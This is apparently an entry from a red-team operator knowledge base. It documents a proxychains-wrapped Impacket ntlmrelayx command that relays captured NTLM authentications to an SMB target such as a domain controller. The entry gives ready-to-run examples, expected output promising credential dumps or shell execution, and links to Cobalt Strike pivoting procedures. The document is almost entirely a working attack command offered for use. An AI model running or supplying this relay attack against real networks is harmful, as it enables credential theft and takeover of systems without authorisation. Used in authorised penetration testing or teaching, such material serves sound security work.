---
type: command
executor: bash
data: 'proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>'
tags:
  - ntlm-relay
  - smb
platforms:
  - Linux
verified: true
validated: true
---

# proxychains-ntlmrelayx-relay-to-smb-target

## Command

```bash
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
```

## Description

This command launches the ntlmrelayx tool from the Impacket suite, configured to listen for incoming NTLM authentications and relay them to a specified SMB target. Proxychains routes the connection through a SOCKS proxy for network pivoting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <IP_TARGET> | IP address of the SMB target (e.g., domain controller) | Yes |
| -t | Specifies the relay target protocol and host | Yes |
| proxychains | Wrapper to proxy traffic via SOCKS | Yes |
| python3 /usr/local/bin/ntlmrelayx.py | Path to the ntlmrelayx executable | Yes |

## Examples

### Basic Usage

```bash
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://192.168.1.10
```

### Advanced Usage

```bash
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://192.168.1.10 --no-http-server --no-smb-server
```

## Expected Output

Listener startup: "[*] Servers started, waiting for connections on 0.0.0.0:445". Upon relay: "[*] SMB challenge received", followed by credential dump or shell execution if successful.

## Related

- [[procedures/NTLM-Relay-Attack-via-Cobalt-Strike]]
- [[commands/beacon-start-socks-proxy]]
